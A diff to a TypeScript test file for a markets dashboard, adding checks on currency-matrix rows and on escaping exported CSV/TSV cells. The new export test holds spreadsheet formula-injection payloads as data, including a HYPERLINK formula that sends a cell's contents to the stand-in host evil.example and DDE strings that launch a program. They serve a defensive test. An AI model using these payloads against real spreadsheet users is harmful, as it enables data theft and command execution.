@@ -84,6 +84,9 @@ ok(order.length <= B.MATRIX_CURRENCIES && order.every((c: string) => c === 'USD'
 const eu = order.indexOf('EUR'), jp = order.indexOf('JPY');
 ok(near(mx.cells[eu][jp].v, 152 / 0.92), 'cells come from the rates against the dollar', mx.cells[eu][jp]);
 ok(mx.cells[eu][0].d1 !== undefined && Math.abs(mx.cells[eu][0].d1) < 1, 'and carry the day’s change', mx.cells[eu][0]);
+// A currency's row carries the economy it was chosen for, not the first user of it in alphabetical order.
+const row = (code: string) => mx.currencies.find((c: any) => c.code === code)?.country?.id;
+ok(row('EUR') === 'country:DEU' && row('INR') === 'country:IND' && row('USD') === 'country:USA', 'each currency’s row is the economy it was chosen for (the euro is Germany’s here, the rupee India’s)', mx.currencies.map((c: any) => `${c.code} ${c.country?.id}`));
 
 // ───────────────────────── Export ─────────────────────────
 console.log('Export of tables');
@@ -95,6 +98,13 @@ ok(lines[0] === 'Market,Price,Note' && lines[1] === 'Brent,82.10,"front month, "
 ok(lines[4] === '' && lines[5] === 'Page,http://localhost:5180/markets?tab=commodities' && lines[6] === 'Exported,2026-11-20T10:00:00.000Z' && csv.endsWith('\r\n'), 'and it says where and when it was taken', lines.slice(4));
 const tsv = X.toTsv(rows).split('\n');
 ok(tsv.length === 4 && tsv[1] === 'Brent\t82.10\tfront month, "ICE"' && tsv[3] === 'Copper\t4.1\ttab here', 'tab-separated for pasting: one cell per column, no stray tabs', tsv);
+// Cells come from outside sources: none may run as a formula when the file is opened.
+const evil = '=HYPERLINK("http://evil.example/?"&A1,"Click")';
+const guarded = X.toTsv([[evil, '@SUM(A1)', '+cmd|\' /C calc\'!A0', '-2+3+cmd|\' /C calc\'!A0', '\t=1+1']]).split('\t');
+ok(guarded.every((c: string) => c.startsWith("'")) && guarded[0] === `'${evil}`, 'text that a spreadsheet would run as a formula is marked as text', guarded);
+const nums = X.toTsv([['-0.08%', '+1.2%', '\u22123.4%', '-$1,234', '6,910.39', '2026-11-20', '—']]).split('\t');
+ok(nums.join(' ') === '-0.08% +1.2% -3.4% -$1,234 6,910.39 2026-11-20 —', 'while plain numbers stay numbers, and the typographic minus becomes the plain one', nums);
+ok(X.toCsv([['=1+2', '-0.5']]).split('\r\n')[0] === "'=1+2,-0.5", 'the same in CSV', X.toCsv([['=1+2', '-0.5']]));
 ok(X.fileName('Major currencies', new Date('2026-11-20T10:00:00Z')) === 'major-currencies-2026-11-20.csv' && X.fileName('Énergie & métaux', new Date('2026-11-20T10:00:00Z')) === 'energie-metaux-2026-11-20.csv' && X.fileName('', new Date('2026-11-20T10:00:00Z')) === 'table-2026-11-20.csv', 'file names from the table’s heading and the date');
 
 console.log(failures ? `\n${failures} check(s) failed` : '\nAll monitor checks passed');
